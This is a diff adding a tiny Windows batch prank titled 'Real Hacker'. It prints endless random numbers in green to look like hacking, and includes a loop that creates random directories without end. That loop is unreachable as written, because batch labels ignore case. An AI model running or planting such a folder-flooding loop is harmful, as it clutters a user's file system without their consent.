@@ -1,0 +1,9 @@
+@echo off 
+color 0a
+title ---------------Real Hacker ---------------
+:a
+echo %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random%  %random% 
+goto a
+:A
+md %random%
+goto A
